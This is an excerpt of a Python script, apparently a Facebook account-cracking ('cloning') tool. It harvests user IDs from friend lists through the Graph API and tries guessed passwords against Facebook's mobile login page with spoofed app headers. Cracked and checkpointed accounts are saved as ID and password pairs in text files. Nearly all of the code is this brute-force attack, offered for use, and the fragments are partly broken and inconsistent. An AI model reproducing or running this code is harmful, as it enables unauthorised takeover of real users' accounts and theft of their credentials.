...
'\x1b[1;91m'====================================================
'\x1b[1;92m'   Github      :     PANDA UNIKER
'\x1b[1;93m'   FB ID       :     Pa N Da
'\x1b[1;94m'   TOOL TYPE   :     FREE COMMANDS
'\x1b[1;91m'==================================================== 
'\x1b[1;92m'_________TOOL KHATTRA XAH SAHI USE GARW
'\x1b[1;93m'====================================================
'\x1b[1;94m'KADAK XAH
'\x1b[1;95m' FILE ADD
 '\x1b[1;96m'====================================================              
...
Pandauniker = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
header= {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent":Panda, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
reload(sys)
...
def main_apv():
    ...
    print "\x1b[1;93m[4]   File Making YO PANI BEST (LOGIN)"
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("        Member In Panda 😁 ")
        print ("        ENJOY GARAA GUYS ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com Panda uniker")
        os.system("rm -rf FREE")
        os.system("cp -f FREE/FREE \\.")
        os.system("rm -rf FREE")
        time.sleep(5)
        ...
        os.system("xdg-open https://wa.me/+9746215262")
        time.sleep(3)
        main_system()
...
def numcloning():
    ...
    print logo
    print ""
    print    "    \033[1;91m\n[ All Country Random Number Cloning ]"
    
    print ""
    print ('\033[1;92m\n   [*] Enter First 4 Latter Of Any NetwoPanda : ')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[Vayo-OK] "+coc+user + " | " + pass1
                ok=open('Vayoni-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;91m[RIAZ-CP] "+coc+user + " | " + pass1
                    cp=open('ops random-co.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
...
def mineExt():
    ...
    print g+"[=] Extracting From RIAZ : "+my_line[:15]
    ...
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From PANDA : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                ok=open('RIAZ-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;97m[RIAZ-CP] "+uid + " | " + pass1
                    cp=open('RIAZ-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[PANDA-OK] "+uid + " | " + pass2
                        ok=open('PANDA-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;97m[PANDA-CP] "+uid + " | " + pass2
                            cp=open('PANDA-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[PANDA-OK] "+uid + " | " + pass3
                                ok=open('PANDA-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;97m[PANDA-CP] "+uid + " | " + pass3
                                    cp=open('PANDA-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[PANDA-OK] "+uid + " | " + pass4
                                        ok=open('PANDA-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;97m[PANDA-CP] "+uid + " | " + pass4
                                            cp=open('PANDA-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[PANDA-OK] "+uid + " | " + pass5
                                                ok=open('PANDA-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;97m[PANDA-CP] "+uid + " | " + pass5
                                                    cp=open('PANDA-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
...
def xokp():
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[PANDA-OK] "+uid + " | " + pass1
                ok=open('PANDA-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;97m[PANDA-CP] "+uid + " | " + pass1
                    cp=open('PANDA-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
...
def n_p_pass():
    ...
    os.system('echo " -----------------------------------"| lolcat')
    print "        Cracking Start Please Wait .. "
    print " IDS AAUDAI XAINA VANE (Airplane) Flight Mod Use GAR"
    os.system('echo " -----------------------------------"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
                                    ...
                                    if "access_token" in q:
                                        ...
                                        if "www.facebook.com" in q ["error_msg"]:
                                            ...
                                            if "access_token" in q:
                                                ...
                                                if "www.facebook.com" in q ["error_msg"]:
                                                    print "\x1b[1;97m[RIAZ-CP] "+uid + " | " + pass5
                                                    cp=open('PANDA-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[PANDA-OK] "+uid + " | " + pass6
                                                        ok=open('PANDA-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;97m[PANDA-CP] "+uid + " | " + pass6
                                                            cp=open('PANDA-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
